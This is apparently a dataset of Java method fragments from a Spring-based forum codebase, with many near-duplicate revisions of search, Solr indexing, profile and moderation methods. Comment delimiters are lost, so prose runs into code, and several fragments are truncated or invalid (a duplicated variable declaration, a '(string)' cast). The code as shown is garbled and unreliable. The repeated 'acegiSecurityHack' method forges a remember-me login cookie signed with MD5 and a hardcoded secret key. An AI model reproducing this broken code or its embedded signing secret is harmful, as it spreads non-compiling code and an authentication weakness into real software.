public ModelAndView showNews ( @RequestParam ( value = " month " , required = false ) Integer month , @RequestParam ( value = " year " , required = false ) Integer year , @RequestParam ( value = " section " , required = false ) Integer sectionid , @RequestParam ( value = " group " , required = false ) Integer groupid , @RequestParam ( value = " tag " , required = false ) String tag , @RequestParam ( value = " offset " , required = false ) Integer offset , HttpServletResponse response ) throws Exception { Map < String , Object > params = new HashMap < String , Object > ( ) ; params . put ( " url " , " view-news.jsp " ) ; StringBuilder urlParams = new StringBuilder ( ) ; if ( sectionid ! = null ) { urlParams . append ( " section= " ) . append ( Integer . toString ( sectionid ) ) ; } if ( tag ! = null ) { if ( urlParams . length ( ) > 0 ) { urlParams . append ( '&' ) ; } urlParams . append ( " tag= " ) . append ( URLEncoder . encode ( tag ) ) ; } if ( groupid ! = null ) { if ( urlParams . length ( ) > 0 ) { urlParams . append ( '&' ) ; } urlParams . append ( " group= " ) . append ( Integer . toString ( groupid ) ) ; } params . put ( " params " , urlParams ) ; Connection db = null ; try { if ( month = = null ) { 
private List < PreparedMessage > getPreparedMessages ( Connection db , boolean cached ) throws SQLException { List < Message > messages = cached ? getMessagesCached ( db ) : getMessages ( db ) ; List < PreparedMessage > pm = new ArrayList < PreparedMessage > ( messages . size ( ) ) ; for ( Message message : messages ) { pm . add ( new PreparedMessage ( db , message , false ) ) ; } return pm ; } 
public ModelAndView showEditForm ( ServletRequest request , @RequestParam ( " msgid " ) int msgid ) throws Exception { Template tmpl = Template . getTemplate ( request ) ; if ( ! tmpl . isSessionAuthorized ( ) ) { throw new AccessViolationException ( " Not authorized " ) ; } Connection db = null ; try { db = LorDataSource . getConnection ( ) ; 
private static ModelAndView prepareModel ( Connection db , PreparedMessage preparedMessage ) throws SQLException , BadGroupException { Map < String , Object > params = new HashMap < String , Object > ( ) ; Message message = preparedMessage . getMessage ( ) ; params . put ( " message " , message ) ; params . put ( " preparedMessage " , preparedMessage ) ; Group group = new Group ( db , message . getGroupId ( ) ) ; params . put ( " group " , group ) ; params . put ( " groups " , Group . getGroups ( db , message . getSection ( ) ) ) ; params . put ( " newMsg " , message ) ; params . put ( " newPreparedMessage " , preparedMessage ) ; List < EditInfoDTO > editInfoList = message . loadEditInfo ( db ) ; if ( ! editInfoList . isEmpty ( ) ) { params . put ( " editInfo " , editInfoList . get ( 0 ) ) ; } params . put ( " commit " , false ) ; return new ModelAndView ( " edit " , params ) ; } 
public ModelAndView viewAll ( @RequestParam ( value = " section " , required = false , defaultValue = " 0 " ) int sectionId , HttpServletRequest request ) throws Exception { Connection db = null ; Template tmpl = Template . getTemplate ( request ) ; ModelAndView modelAndView = new ModelAndView ( " view-all " ) ; try { db = LorDataSource . getConnection ( ) ; 
public void acegiSecurityHack ( HttpServletResponse response , HttpSession session ) { String username = nick ; String cookieName = "ACEGI_SECURITY_HASHED_REMEMBER_ME_COOKIE"; ACEGI_SECURITY_HASHED_REMEMBER_ME_COOKIE_KEY; String cookieName = "SPRING_SECURITY_HASHED_REMEMBER_ME_COOKIE"; ACEGI_SECURITY_HASHED_REMEMBER_ME_COOKIE_KEY; long tokenValiditySeconds = 1209600; 14 days String key = "jam35Wiki"; from applicationContext-acegi-security.xml long expiryTime = System.currentTimeMillis() + (tokenValiditySeconds * 1000); construct token to put in cookie; format is: username + ":" + expiryTime + ":" + Md5Hex(username + ":" + expiryTime + ":" + password + ":" + key) String signatureValue = StringUtil.md5hash(username + ':' + expiryTime + ':' + password + ':' + key); String tokenValue = username + ':' + expiryTime + ':' + signatureValue; String tokenValueBase64 = new String(Base64.encodeBase64(tokenValue.getBytes())); Add remember me cookie Cookie acegi = new Cookie(cookieName, tokenValueBase64); acegi.setMaxAge(Long.valueOf(expiryTime).intValue()); acegi.setPath("/wiki"); response.addCookie(acegi); Remove ACEGI_SECURITY_CONTEXT and session session.removeAttribute("ACEGI_SECURITY_CONTEXT"); if any } 
public void acegiSecurityHack ( HttpServletResponse response , HttpSession session ) { String username = nick ; String cookieName = "ACEGI_SECURITY_HASHED_REMEMBER_ME_COOKIE"; ACEGI_SECURITY_HASHED_REMEMBER_ME_COOKIE_KEY; String cookieName = "SPRING_SECURITY_REMEMBER_ME_COOKIE"; ACEGI_SECURITY_HASHED_REMEMBER_ME_COOKIE_KEY; long tokenValiditySeconds = 1209600; 14 days String key = "jam35Wiki"; from applicationContext-acegi-security.xml long expiryTime = System.currentTimeMillis() + (tokenValiditySeconds * 1000); construct token to put in cookie; format is: username + ":" + expiryTime + ":" + Md5Hex(username + ":" + expiryTime + ":" + password + ":" + key) String signatureValue = StringUtil.md5hash(username + ':' + expiryTime + ':' + password + ':' + key); String tokenValue = username + ':' + expiryTime + ':' + signatureValue; String tokenValueBase64 = new String(Base64.encodeBase64(tokenValue.getBytes())); Add remember me cookie Cookie acegi = new Cookie(cookieName, tokenValueBase64); acegi.setMaxAge(Long.valueOf(expiryTime).intValue()); acegi.setPath("/wiki"); response.addCookie(acegi); Remove ACEGI_SECURITY_CONTEXT and session session.removeAttribute("ACEGI_SECURITY_CONTEXT"); if any } 
public void acegiSecurityHack ( HttpServletResponse response , HttpSession session ) { String username = nick ; String cookieName = "ACEGI_SECURITY_HASHED_REMEMBER_ME_COOKIE"; ACEGI_SECURITY_HASHED_REMEMBER_ME_COOKIE_KEY; String cookieName = LoginController.ACEGE_COOKIE_NAME; ACEGI_SECURITY_HASHED_REMEMBER_ME_COOKIE_KEY; long tokenValiditySeconds = 1209600; 14 days String key = "jam35Wiki"; from applicationContext-acegi-security.xml long expiryTime = System.currentTimeMillis() + (tokenValiditySeconds * 1000); construct token to put in cookie; format is: username + ":" + expiryTime + ":" + Md5Hex(username + ":" + expiryTime + ":" + password + ":" + key) String signatureValue = StringUtil.md5hash(username + ':' + expiryTime + ':' + password + ':' + key); String tokenValue = username + ':' + expiryTime + ':' + signatureValue; String tokenValueBase64 = new String(Base64.encodeBase64(tokenValue.getBytes())); Add remember me cookie Cookie acegi = new Cookie(cookieName, tokenValueBase64); acegi.setMaxAge(Long.valueOf(expiryTime).intValue()); acegi.setPath("/wiki"); response.addCookie(acegi); Remove ACEGI_SECURITY_CONTEXT and session session.removeAttribute("ACEGI_SECURITY_CONTEXT"); if any } 
private static Map < String , Object > createDefaultProfile ( ) { Map < String , Object > defaults = new HashMap < String , Object > ( ) ; defaults . put ( " newfirst " , Boolean . FALSE ) ; defaults . put ( " hover " , Boolean . TRUE ) ; defaults . put ( " style " , " tango " ) ; defaults . put ( " format.mode " , " quot " ) ; defaults . put ( " topics " , 30 ) ; defaults . put ( " messages " , 50 ) ; defaults . put ( " tags " , 50 ) ; defaults . put ( " photos " , Boolean . TRUE ) ; defaults . put ( " system.timestamp " , new Date ( ) . getTime ( ) ) ; defaults . put ( " showinfo " , Boolean . TRUE ) ; defaults . put ( " showanonymous " , Boolean . TRUE ) ; defaults . put ( " showsticky " , Boolean . TRUE ) ; defaults . put ( " avatar " , " empty " ) ; defaults . put ( HIDE_ADSENSE , true ) ; defaults . put ( MAIN_GALLERY , false ) ; defaults . put ( " DebugMode " , Boolean . FALSE ) ; main page settings defaults.put("main.3columns", Boolean.FALSE); ImmutableList<String> boxes = ImmutableList.of( "ibm", "poll", "top10", "gallery", "tagcloud", "archive", "tshirt" ); defaults.put("main2", boxes); ImmutableList<String> boxes31 = ImmutableList.of( "ibm", "poll", "archive", "tagcloud" ); defaults.put("main3-1", boxes31); ImmutableList<String> boxes32 = ImmutableList.of( "top10", "gallery", "tshirt" ); defaults.put("main3-2", boxes32); return defaults; } 
public static BanInfo getBanInfo ( Connection db , User user ) throws SQLException { Statement st = null ; try { st = db . createStatement ( ) ; 
public void block ( Connection db , User by , String reason ) throws SQLException { Statement st = null ; PreparedStatement pst = null ; try { st = db . createStatement ( ) ; 
public ModelAndView modifyUser ( HttpServletRequest request , HttpSession session , @RequestParam ( " action " ) String action , @RequestParam ( " id " ) int id , @RequestParam ( value = " reason " , required = false ) String reason ) throws Exception { Template tmpl = Template . getTemplate ( request ) ; if ( ! tmpl . isModeratorSession ( ) ) { throw new AccessViolationException ( " Not moderator " ) ; } Connection db = null ; try { db = LorDataSource . getConnection ( ) ; 
public List < SearchItem > show ( Connection db ) throws SQLException , UserErrorException , MalformedURLException , SolrServerException { QueryResponse response ; SolrServer solr = new CommonsHttpSolrServer ( " http:stress.vyborg.ru/solr " ) ; ModifiableSolrParams params = new ModifiableSolrParams ( ) ; List < SearchItem > items = new ArrayList < SearchItem > ( ) ; params . set ( " q " , query ) ; params . set ( " rows " , 100 ) ; response = solr . query ( params ) ; SolrDocumentList list = response . getResults ( ) ; for ( SolrDocument doc : list ) { items . add ( new SearchItem ( db , doc ) ) ; } return ImmutableList . copyOf ( items ) ; 
public List < SearchItem > show ( Connection db ) throws SQLException , UserErrorException , MalformedURLException , SolrServerException { QueryResponse response ; SolrServer solr = new CommonsHttpSolrServer ( " http:stress.vyborg.ru/solr " ) ; ModifiableSolrParams params = new ModifiableSolrParams ( ) ; List < SearchItem > items = new ArrayList < SearchItem > ( ) ; set search query params params.set("q", query); params.set("q.op", "AND"); params.set("rows", 100); if(include != SEARCH_ALL){ params.set("fq","is_comment:false"); } if(date == SEARCH_3MONTH){ params.set("fq","postdate:[NOW-3MONTH TO NOW]"); }else if (date == SEARCH_YEAR){ params.set("fq","postdate:[NOW-1YEAR TO NOW]"); } if (section != 0 ){ params.set("fq","section_id:"+section); } if (username.length()>0) { try { User user = User.getUser(db, username); if (userTopic) { params.set("fq","user_id:"+user.getId()); } } catch (UserNotFoundException ex) { throw new UserErrorException("User not found: "+username); } } send search query to solr response = solr.query(params); SolrDocumentList list = response.getResults(); for (SolrDocument doc : list) { items.add(new SearchItem(db, doc)); } return ImmutableList.copyOf(items); 
public List < SearchItem > show ( Connection db ) throws SQLException , UserErrorException , MalformedURLException , SolrServerException { QueryResponse response ; SolrServer solr = new CommonsHttpSolrServer ( " http:stress.vyborg.ru/solr " ) ; ModifiableSolrParams params = new ModifiableSolrParams ( ) ; List < SearchItem > items = new ArrayList < SearchItem > ( ) ; set search query params params.set("q", query); params.set("q.op", "AND"); params.set("rows", 100); if(include != SEARCH_ALL){ params.set("fq","is_comment:false"); } if(date == SEARCH_3MONTH){ params.set("fq","postdate:[NOW-3MONTH TO NOW]"); }else if (date == SEARCH_YEAR){ params.set("fq","postdate:[NOW-1YEAR TO NOW]"); } if (section != 0 ){ params.set("fq","section_id:"+section); } if(username.length() > 0) { try { User user = User.getUser(db, username); if (userTopic) { params.set("fq","user_id:"+user.getId()); } } catch (UserNotFoundException ex) { throw new UserErrorException("User not found: "+username); } } if(sort == SORT_DATE){ params.set("sort:postdate desc"); } send search query to solr response = solr.query(params); SolrDocumentList list = response.getResults(); for (SolrDocument doc : list) { items.add(new SearchItem(db, doc)); } return ImmutableList.copyOf(items); } 
public List < SearchItem > show ( Connection db ) throws SQLException , UserErrorException { QueryResponse response ; SolrServer solr ; try { solr = new CommonsHttpSolrServer ( " http:stress.vyborg.ru/solr " ) ; } catch ( MalformedURLException ex ) { throw new RuntimeException ( ex ) ; } ModifiableSolrParams params = new ModifiableSolrParams ( ) ; List < SearchItem > items = new ArrayList < SearchItem > ( ) ; set search query params params.set("q", query); params.set("q.op", "AND"); params.set("rows", 100); if(include != SEARCH_ALL){ params.set("fq","is_comment:false"); } if(date == SEARCH_3MONTH){ params.set("fq","postdate:[NOW-3MONTH TO NOW]"); }else if (date == SEARCH_YEAR){ params.set("fq","postdate:[NOW-1YEAR TO NOW]"); } if (section != 0 ){ params.set("fq","section_id:"+section); } if(username.length() > 0) { try { User user = User.getUser(db, username); if (userTopic) { params.set("fq","user_id:"+user.getId()); } } catch (UserNotFoundException ex) { throw new UserErrorException("User not found: "+username); } } if(sort == SORT_DATE){ params.set("sort:postdate desc"); } params.set("rows:100"); maximum number of documents from the complete result set to return to the client send search query to solr try{ response = solr.query(params); }catch(SolrServerException ex){ throw new RuntimeException(ex); } SolrDocumentList list = response.getResults(); for (SolrDocument doc : list) { items.add(new SearchItem(db, doc)); } return ImmutableList.copyOf(items); } 
public void destroy ( ) { logger . debug ( " Shutting down memcached " ) ; MemCachedSettings . getMemCachedClient ( ) . shutdown ( ) ; } 
public static void updateComment ( SolrServer server , Comment comment , int msgid , int sectionId , String message ) { UpdateRequest updateRequest = new UpdateRequest ( ) ; updateRequest . setAction ( AbstractUpdateRequest . ACTION . COMMIT , false , false ) ; SolrInputDocument doc = new SolrInputDocument ( ) ; doc . addField ( " id " , msgid ) ; doc . addField ( " section_id " , sectionId ) ; doc . addField ( " user_id " , comment . getUserid ( ) ) ; doc . addField ( " topic_id " , comment . getTopic ( ) ) ; doc . addField ( " title " , comment . getTitle ( ) ) ; doc . addField ( " message " , message ) ; Date postdate = comment . getPostdate ( ) ; doc . addField ( " postdate " , new Timestamp ( postdate . getTime ( ) ) ) ; doc . addField ( " is_comment " , true ) ; updateRequest . add ( doc ) ; try { updateRequest . process ( server ) ; 
public static void updateMessage ( SolrServer server , Message topic , int msgid ) { UpdateRequest updateRequest = new UpdateRequest ( ) ; updateRequest . setAction ( AbstractUpdateRequest . ACTION . COMMIT , false , false ) ; SolrInputDocument doc = new SolrInputDocument ( ) ; doc . addField ( " id " , msgid ) ; doc . addField ( " section_id " , msgid ) ; doc . addField ( " user_id " , topic . getUid ( ) ) ; doc . addField ( " topic_id " , topic . getMessageId ( ) ) ; doc . addField ( " title " , topic . getTitle ( ) ) ; doc . addField ( " message " , topic . getMessage ( ) ) ; Date postdate = topic . getPostdate ( ) ; doc . addField ( " postdate " , new Timestamp ( postdate . getTime ( ) ) ) ; doc . addField ( " is_comment " , false ) ; updateRequest . add ( doc ) ; try { updateRequest . process ( server ) ; 
public ModelAndView edit ( HttpServletRequest request , @RequestParam ( " msgid " ) int msgid , @RequestParam ( value = " lastEdit " , required = false ) Long lastEdit , @RequestParam ( value = " bonus " , required = false , defaultValue = " 3 " ) int bonus , @RequestParam ( value = " chgrp " , required = false ) Integer changeGroupId ) throws Exception { Template tmpl = Template . getTemplate ( request ) ; HttpSession session = request . getSession ( ) ; if ( ! tmpl . isSessionAuthorized ( ) ) { throw new AccessViolationException ( " Not authorized " ) ; } Map < String , Object > params = new HashMap < String , Object > ( ) ; Connection db = null ; SolrServer search = null ; try { db = LorDataSource . getConnection ( ) ; 
public List < SearchItem > show ( Connection db ) throws SQLException , UserErrorException { QueryResponse response ; SolrServer solr ; try { solr = new CommonsHttpSolrServer ( " http:stress.vyborg.ru/solr " ) ; } catch ( MalformedURLException ex ) { throw new RuntimeException ( ex ) ; } ModifiableSolrParams params = new ModifiableSolrParams ( ) ; List < SearchItem > items = new ArrayList < SearchItem > ( ) ; set search query params params.set("q", query); params.set("q.op", "AND"); params.set("rows", 100); if(include != SEARCH_ALL){ params.set("fq","is_comment:false"); } if(date == SEARCH_3MONTH){ params.set("fq","postdate:[NOW-3MONTH TO NOW]"); }else if (date == SEARCH_YEAR){ params.set("fq","postdate:[NOW-1YEAR TO NOW]"); } if (section != 0 ){ params.set("fq","section_id:"+section); } if(username.length() > 0) { try { User user = User.getUser(db, username); if (userTopic) { params.set("fq","user_id:"+user.getId()); } } catch (UserNotFoundException ex) { throw new UserErrorException("User not found: "+username); } } if(sort == SORT_DATE){ params.set("sort:postdate desc"); } params.set("rows:100"); maximum number of documents from the complete result set to return to the client send search query to solr try{ response = solr.query(params); SolrDocumentList list = response.getResults(); for (SolrDocument doc : list) { items.add(new SearchItem(db, doc)); } }catch(SolrServerException ex){ logger.error("Error search:"+ex.toString()); } return ImmutableList.copyOf(items); } 
public static void updateMessage ( SolrServer server , Message topic , int msgid ) { if ( server ! = null ) { UpdateRequest updateRequest = new UpdateRequest ( ) ; 
public static void updateComment ( SolrServer server , Comment comment , int msgid , int sectionId , String message ) { if ( server ! = null ) { UpdateRequest updateRequest = new UpdateRequest ( ) ; 
public List < SearchItem > show ( Connection db ) throws SQLException , UserErrorException { QueryResponse response ; SolrServer solr ; try { InitialContext cxt = new InitialContext ( ) ; String url = ( String ) cxt . lookup ( " java:/comp/env/solr/url " ) ; solr = new CommonsHttpSolrServer ( url ) ; } catch ( MalformedURLException ex ) { throw new RuntimeException ( ex ) ; } catch ( NamingException ex ) { throw new RuntimeException ( ex ) ; } ModifiableSolrParams params = new ModifiableSolrParams ( ) ; List < SearchItem > items = new ArrayList < SearchItem > ( ) ; set search query params params.set("q", query); params.set("q.op", "AND"); params.set("rows", 100); if(include != SEARCH_ALL){ params.set("fq","is_comment:false"); } if(date == SEARCH_3MONTH){ params.set("fq","postdate:[NOW-3MONTH TO NOW]"); }else if (date == SEARCH_YEAR){ params.set("fq","postdate:[NOW-1YEAR TO NOW]"); } if (section != 0 ){ params.set("fq","section_id:"+section); } if(username.length() > 0) { try { User user = User.getUser(db, username); if (userTopic) { params.set("fq","user_id:"+user.getId()); } } catch (UserNotFoundException ex) { throw new UserErrorException("User not found: "+username); } } if(sort == SORT_DATE){ params.set("sort:postdate desc"); } params.set("rows:100"); maximum number of documents from the complete result set to return to the client send search query to solr try{ response = solr.query(params); SolrDocumentList list = response.getResults(); for (SolrDocument doc : list) { items.add(new SearchItem(db, doc)); } }catch(SolrServerException ex){ logger.error("Error search:"+ex.toString()); } return ImmutableList.copyOf(items); } 
public List < SearchItem > show ( Connection db ) throws SQLException , UserErrorException { QueryResponse response ; SolrServer search = LorSearchSource . getConnection ( ) ; ModifiableSolrParams params = new ModifiableSolrParams ( ) ; List < SearchItem > items = new ArrayList < SearchItem > ( ) ; set search query params params.set("q", query); params.set("q.op", "AND"); params.set("rows", 100); if(include != SEARCH_ALL){ params.set("fq","is_comment:false"); } if(date == SEARCH_3MONTH){ params.set("fq","postdate:[NOW-3MONTH TO NOW]"); }else if (date == SEARCH_YEAR){ params.set("fq","postdate:[NOW-1YEAR TO NOW]"); } if (section != 0 ){ params.set("fq","section_id:"+section); } if(username.length() > 0) { try { User user = User.getUser(db, username); if (userTopic) { params.set("fq","user_id:"+user.getId()); } } catch (UserNotFoundException ex) { throw new UserErrorException("User not found: "+username); } } if(sort == SORT_DATE){ params.set("sort:postdate desc"); } params.set("rows:100"); maximum number of documents from the complete result set to return to the client send search query to solr try{ response = search.query(params); SolrDocumentList list = response.getResults(); for (SolrDocument doc : list) { items.add(new SearchItem(db, doc)); } }catch(SolrServerException ex){ logger.error("Error search:"+ex.toString()); } return ImmutableList.copyOf(items); } 
public List < SearchItem > show ( Connection db ) throws SQLException , UserErrorException { QueryResponse response ; SolrServer search = LorSearchSource . getConnection ( ) ; ModifiableSolrParams params = new ModifiableSolrParams ( ) ; List < SearchItem > items = new ArrayList < SearchItem > ( ) ; set search query params params.set("q", query); params.set("q.op", "AND"); params.set("rows", 100); params.set("defType", "dismax"); params.set("qf", "message title"); if(include != SEARCH_ALL){ params.set("fq","is_comment:false"); } if(date == SEARCH_3MONTH){ params.set("fq","postdate:[NOW-3MONTH TO NOW]"); }else if (date == SEARCH_YEAR){ params.set("fq","postdate:[NOW-1YEAR TO NOW]"); } if (section != 0 ){ params.set("fq","section_id:"+section); } if(username.length() > 0) { try { User user = User.getUser(db, username); if (userTopic) { params.set("fq","user_id:"+user.getId()); } } catch (UserNotFoundException ex) { throw new UserErrorException("User not found: "+username); } } if(sort == SORT_DATE){ params.set("sort:postdate desc"); } params.set("rows:100"); maximum number of documents from the complete result set to return to the client send search query to solr try{ response = search.query(params); SolrDocumentList list = response.getResults(); for (SolrDocument doc : list) { items.add(new SearchItem(db, doc)); } }catch(SolrServerException ex){ logger.error("Error search:"+ex.toString()); } return ImmutableList.copyOf(items); } 
public List < SearchItem > show ( Connection db ) throws SQLException , UserErrorException { QueryResponse response ; SolrServer search = LorSearchSource . getConnection ( ) ; ModifiableSolrParams params = new ModifiableSolrParams ( ) ; List < SearchItem > items = new ArrayList < SearchItem > ( ) ; set search query params params.set("q", query); params.set("q.op", "AND"); params.set("rows", 100); params.set("defType", "dismax"); params.set("qf", "message title"); if(include != SEARCH_ALL){ params.add("fq","is_comment:false"); } if(date == SEARCH_3MONTH){ params.add("fq","postdate:[NOW-3MONTH TO NOW]"); }else if (date == SEARCH_YEAR){ params.add("fq","postdate:[NOW-1YEAR TO NOW]"); } if (section != 0 ){ params.add("fq","section_id:"+section); } if(username.length() > 0) { try { User user = User.getUser(db, username); if (userTopic) { params.add("fq","user_id:"+user.getId()); } } catch (UserNotFoundException ex) { throw new UserErrorException("User not found: "+username); } } if(sort == SORT_DATE){ params.set("sort:postdate desc"); } params.set("rows:100"); maximum number of documents from the complete result set to return to the client send search query to solr try{ response = search.query(params); SolrDocumentList list = response.getResults(); for (SolrDocument doc : list) { items.add(new SearchItem(db, doc)); } }catch(SolrServerException ex){ logger.error("Error search:"+ex.toString()); } return ImmutableList.copyOf(items); } 
public List < SearchItem > show ( Connection db ) throws SQLException , UserErrorException { QueryResponse response ; SolrServer search = LorSearchSource . getConnection ( ) ; ModifiableSolrParams params = new ModifiableSolrParams ( ) ; List < SearchItem > items = new ArrayList < SearchItem > ( ) ; set search query params params.set("q", query); params.set("q.op", "AND"); params.set("rows", 100); params.set("qt", "dismax"); if(include != SEARCH_ALL){ params.add("fq","is_comment:false"); } if(date == SEARCH_3MONTH){ params.add("fq","postdate:[NOW-3MONTH TO NOW]"); }else if (date == SEARCH_YEAR){ params.add("fq","postdate:[NOW-1YEAR TO NOW]"); } if (section != 0 ){ params.add("fq","section_id:"+section); } if(username.length() > 0) { try { User user = User.getUser(db, username); if (userTopic) { params.add("fq","user_id:"+user.getId()); } } catch (UserNotFoundException ex) { throw new UserErrorException("User not found: "+username); } } if(sort == SORT_DATE){ params.set("sort:postdate desc"); } params.set("rows:100"); maximum number of documents from the complete result set to return to the client send search query to solr try{ response = search.query(params); SolrDocumentList list = response.getResults(); for (SolrDocument doc : list) { items.add(new SearchItem(db, doc)); } }catch(SolrServerException ex){ logger.error("Error search:"+ex.toString()); } return ImmutableList.copyOf(items); } 
public static void updateComment ( SolrServer server , Comment comment , int msgid , int sectionId , String message ) throws java . sql . SQLException { if ( server ! = null ) { UpdateRequest updateRequest = new UpdateRequest ( ) ; 
public static void updateComment ( SolrServer server , Comment comment , Message topic , int msgid , String message ) { if ( server ! = null ) { UpdateRequest updateRequest = new UpdateRequest ( ) ; 
public static void updateMessage ( SolrServer server , Message topic , int msgid ) throws IOException , SolrServerException { UpdateRequest updateRequest = new UpdateRequest ( ) ; updateRequest . setAction ( AbstractUpdateRequest . ACTION . COMMIT , false , false ) ; SolrInputDocument doc = new SolrInputDocument ( ) ; doc . addField ( " id " , msgid ) ; doc . addField ( " section_id " , msgid ) ; doc . addField ( " user_id " , topic . getUid ( ) ) ; doc . addField ( " topic_id " , topic . getMessageId ( ) ) ; doc . addField ( " title " , topic . getTitle ( ) ) ; doc . addField ( " message " , topic . getMessage ( ) ) ; Date postdate = topic . getPostdate ( ) ; doc . addField ( " postdate " , new Timestamp ( postdate . getTime ( ) ) ) ; doc . addField ( " is_comment " , false ) ; updateRequest . add ( doc ) ; updateRequest . process ( server ) ; } 
public static void updateComment ( SolrServer server , Comment comment , Message topic , int msgid , String message ) throws IOException , SolrServerException { UpdateRequest updateRequest = new UpdateRequest ( ) ; updateRequest . setAction ( AbstractUpdateRequest . ACTION . COMMIT , false , false ) ; SolrInputDocument doc = new SolrInputDocument ( ) ; doc . addField ( " id " , msgid ) ; doc . addField ( " section_id " , topic . getSectionId ( ) ) ; doc . addField ( " user_id " , comment . getUserid ( ) ) ; doc . addField ( " topic_id " , comment . getTopic ( ) ) ; String commentTitle = comment . getTitle ( ) ; if ( commentTitle = = null | | commentTitle . isEmpty ( ) ) { doc . addField ( " title " , topic . getTitle ( ) ) ; } else { doc . addField ( " title " , commentTitle ) ; } doc . addField ( " message " , message ) ; Date postdate = comment . getPostdate ( ) ; doc . addField ( " postdate " , new Timestamp ( postdate . getTime ( ) ) ) ; doc . addField ( " is_comment " , true ) ; updateRequest . add ( doc ) ; updateRequest . process ( server ) ; } 
public List < SearchItem > get ( SearchViewer viewer , boolean nocache ) throws SQLException , UserErrorException , SolrServerException { CacheProvider mcc = MemCachedSettings . getCache ( ) ; String cacheId = viewer . getVariantID ( ) ; List < SearchItem > res = null ; if ( ! nocache ) { time = 0 ; long current = System . currentTimeMillis ( ) ; res = ( List < SearchItem > ) mcc . getFromCache ( cacheId ) ; time = System . currentTimeMillis ( ) - current ; fromCache = true ; } if ( res = = null ) { Connection db = null ; try { long current = System . currentTimeMillis ( ) ; db = LorDataSource . getConnection ( ) ; res = viewer . show ( db ) ; time = System . currentTimeMillis ( ) - current ; fromCache = false ; } finally { if ( db ! = null ) { db . close ( ) ; } } mcc . storeToCache ( cacheId , res , 15 * 60 * 1000 ) ; } return res ; } 
public List < SearchItem > show ( Connection db ) throws SQLException , UserErrorException , SolrServerException { QueryResponse response ; SolrServer search = LorSearchSource . getConnection ( ) ; ModifiableSolrParams params = new ModifiableSolrParams ( ) ; List < SearchItem > items = new ArrayList < SearchItem > ( ) ; set search query params params.set("q", query); params.set("q.op", "AND"); params.set("rows", 100); params.set("qt", "dismax"); if(include != SEARCH_ALL){ params.add("fq","is_comment:false"); } if(date == SEARCH_3MONTH){ params.add("fq","postdate:[NOW-3MONTH TO NOW]"); }else if (date == SEARCH_YEAR){ params.add("fq","postdate:[NOW-1YEAR TO NOW]"); } if (section != 0 ){ params.add("fq","section_id:"+section); } if(username.length() > 0) { try { User user = User.getUser(db, username); if (userTopic) { params.add("fq","user_id:"+user.getId()); } } catch (UserNotFoundException ex) { throw new UserErrorException("User not found: "+username); } } if(sort == SORT_DATE){ params.set("sort:postdate desc"); } params.set("rows:100"); maximum number of documents from the complete result set to return to the client send search query to solr response = search.query(params); SolrDocumentList list = response.getResults(); for (SolrDocument doc : list) { items.add(new SearchItem(db, doc)); } return ImmutableList.copyOf(items); } 
public static void delete ( SolrServer server , int msgid ) { try { server.deleteById((string) msgid); 
public List < SearchItem > show ( Connection db ) throws SQLException , UserErrorException { QueryResponse response ; SolrServer search = LorSearchSource . getConnection ( ) ; ModifiableSolrParams params = new ModifiableSolrParams ( ) ; List < SearchItem > items = new ArrayList < SearchItem > ( ) ; set search query params params.set("q", query); params.set("q.op", "AND"); params.set("rows", 100); params.set("qt", "dismax"); if(include != SEARCH_ALL){ params.add("fq","is_comment:false"); } if(date == SEARCH_3MONTH){ params.add("fq","postdate:[NOW-3MONTH TO NOW]"); }else if (date == SEARCH_YEAR){ params.add("fq","postdate:[NOW-1YEAR TO NOW]"); } if (section != 0 ){ params.add("fq","section_id:"+section); } if(username.length() > 0) { try { User user = User.getUser(db, username); if (userTopic) { params.add("fq","user_id:"+user.getId()); } } catch (UserNotFoundException ex) { throw new UserErrorException("User not found: "+username); } } if(sort == SORT_DATE){ params.set("sort","postdate desc"); } params.set("rows:100"); maximum number of documents from the complete result set to return to the client send search query to solr try{ response = search.query(params); SolrDocumentList list = response.getResults(); for (SolrDocument doc : list) { items.add(new SearchItem(db, doc)); } }catch(SolrServerException ex){ logger.error("Error search:"+ex.toString()); } return ImmutableList.copyOf(items); } 
public List < SearchItem > show ( Connection db ) throws SQLException , UserErrorException , SolrServerException { SolrServer search = LorSearchSource . getConnection ( ) ; ModifiableSolrParams params = new ModifiableSolrParams ( ) ; List < SearchItem > items = new ArrayList < SearchItem > ( ) ; set search query params params.set("q", query); params.set("q.op", "AND"); params.set("rows", 100); params.set("qt", "dismax"); if(include != SEARCH_ALL){ params.add("fq","is_comment:false"); } if(date == SEARCH_3MONTH){ params.add("fq","postdate:[NOW-3MONTH TO NOW]"); }else if (date == SEARCH_YEAR){ params.add("fq","postdate:[NOW-1YEAR TO NOW]"); } if (section != 0 ){ params.add("fq","section_id:"+section); } if(username.length() > 0) { try { User user = User.getUser(db, username); if (userTopic) { params.add("fq","user_id:"+user.getId()); } } catch (UserNotFoundException ex) { throw new UserErrorException("User not found: "+username); } } if(sort == SORT_DATE){ params.set("sort:postdate desc"); } params.set("rows:100"); maximum number of documents from the complete result set to return to the client send search query to solr QueryResponse response = search.query(params); SolrDocumentList list = response.getResults(); for (SolrDocument doc : list) { items.add(new SearchItem(db, doc)); } return ImmutableList.copyOf(items); } 
public ModelAndView search ( @RequestParam ( value = " q " , required = false ) String q , @RequestParam ( value = " include " , required = false ) String includeString , @RequestParam ( value = " date " , required = false ) String dateString , @RequestParam ( value = " section " , required = false ) Integer section , @RequestParam ( value = " sort " , required = false ) Integer sort , @RequestParam ( value = " username " , required = false ) String username , @RequestParam ( value = " usertopic " , required = false ) Boolean usertopic ) throws Exception { Map < String , Object > params = new HashMap < String , Object > ( ) ; boolean initial = q = = null ; params . put ( " initial " , initial ) ; if ( q = = null ) { q = " " ; } if ( usertopic = = null ) { usertopic = false ; } params . put ( " usertopic " , usertopic ) ; params . put ( " q " , q ) ; int include = parseInclude ( includeString ) ; params . put ( " include " , include ) ; int date = parseDate ( dateString ) ; params . put ( " date " , date ) ; if ( section = = null ) { section = 0 ; } params . put ( " section " , section ) ; if ( sort = = null ) { sort = SearchViewer . SORT_R ; } params . put ( " sort " , sort ) ; if ( username = = null ) { username = " " ; } params . put ( " username " , username ) ; if ( ! initial ) { SearchViewer sv = new SearchViewer ( q ) ; sv . setDate ( date ) ; sv . setInclude ( include ) ; sv . setSection ( section ) ; sv . setSort ( sort ) ; sv . setUser ( username ) ; sv . setUserTopic ( usertopic ) ; List < SearchItem > res = null ; long time ; Connection db = null ; try { long current = System . currentTimeMillis ( ) ; db = LorDataSource . getConnection ( ) ; res = sv . show ( db ) ; time = System . currentTimeMillis ( ) - current ; } finally { if ( db ! = null ) { db . close ( ) ; } } params . put ( " result " , res ) ; params . put ( " time " , time ) ; } return new ModelAndView ( " search " , params ) ; } 
